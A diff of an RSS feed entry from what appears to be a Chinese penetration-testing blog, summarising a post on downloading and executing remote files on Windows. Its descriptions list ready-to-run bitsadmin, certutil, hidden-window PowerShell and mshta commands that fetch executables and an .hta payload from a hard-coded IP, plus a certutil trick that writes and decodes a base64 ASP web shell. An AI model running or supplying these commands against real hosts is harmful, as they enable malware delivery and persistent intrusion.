@@ -18,9 +18,11 @@
       <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</guid>
-      <description>0x00 bitsadmin下载文件 win2008
-bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload 114.115.214.203/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal &amp;quot;http://114.115.214.203/a.exe&amp;quot; &amp;quot;C:\Windows\Temp\a.exe&amp;quot;  0x01 powershell下载文件 win2008
-powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;)  0x02 certutil下载文件 certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe #写文件的方法： mshta vbscript:createobject(&amp;quot;scripting.filesystemobject&amp;quot;).createtextfile(&amp;quot;test11.txt&amp;quot;,2,ture).writeline(&amp;quot;PCVleGVjdXRlKHJlcXVlc3QoImwiKSklPg==&amp;quot;)(window.close) certutil -decode test11.txt mu.asp #一句话马 type mu.asp  0x03 mshta执行远程hta mshta http://114.115.214.203/payload.hta  payload.</description>
+      <description>环境：Windows Server 2008 R2 Enterprise
+0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.214.203/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.214.203/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
+certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
+本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.214.203/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+certutil -urlcache -f http://114.115.214.203/a.exe  0x02 powershell下载文件 powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
     </item>
     
     <item>
